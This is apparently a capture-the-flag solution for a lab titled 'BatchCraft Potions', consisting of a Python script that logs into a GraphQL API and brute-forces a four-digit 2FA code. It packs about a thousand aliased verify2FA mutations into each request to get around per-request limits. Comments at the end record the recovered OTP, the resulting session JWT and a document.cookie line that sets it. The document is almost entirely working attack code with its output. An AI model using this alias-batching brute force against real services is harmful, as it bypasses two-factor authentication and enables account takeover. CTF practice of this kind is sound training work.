# BatchCraft Potions

```python
from urllib.request import urlopen, Request
from num2words import num2words
from time import sleep
from json import load

translate = "".maketrans("- ", "__", ",")
url = "http://134.209.22.155:30244/graphql"
otp_found = False

# limited to 1k try per request
def find_otp(frm, to):
    if otp_found:
        exit()
    # first: verify2FA(otp: $otp) { message, token }
    data = b""
    for i in range(frm, to):
        data += (num2words(i).translate(translate) + f': verify2FA(otp: \\"{str(i).zfill(4)}\\") ' + "{ message, token } ").encode()
    response = load(
        urlopen(
            Request(
                url,
                method="POST",
                data=b'{"query": "mutation($otp: String!) { zero: verify2FA(otp: $otp) { message, token } ' + data + b'}", "variables":{"otp":"0000"} }',
                headers={"Cookie": cookie, "Content-Type": "application/json"}
            )
        )
    )
    for nbr in response["data"].keys():
        val = response["data"][str(nbr)]
        if val != None:
            print(f"FOUND OTP {nbr}\n{val}")
            return True

token = load(
    urlopen(
        Request(
            url,
            method="POST",
            data=b'{"query":"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }","variables":{"username":"vendor53","password":"PotionsFTW!"} }',
            headers={"Content-Type": "application/json"}
        )
    )
)["data"]["LoginUser"]["token"]
cookie = "session=" + token

for i in range(1, 10001, 1000):
    n1 = (i if i == 1 else i - 1)
    n2 = i + 1000
    print(str(n1).zfill(4), "->", n2)
    otp_found = find_otp(n1, n2)
    sleep(5)

# FOUND OTP seven_thousand_seven_hundred_and_twenty_four
# {'message': '2FA verified successfully!', 'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDE3NDkwM30.0n0ol0jzMU4P2k1xK2CQeYYKyCaf8_UV9nTRr9SUZgE'}
# document.cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDE3NDkwM30.0n0ol0jzMU4P2k1xK2CQeYYKyCaf8_UV9nTRr9SUZgE"
```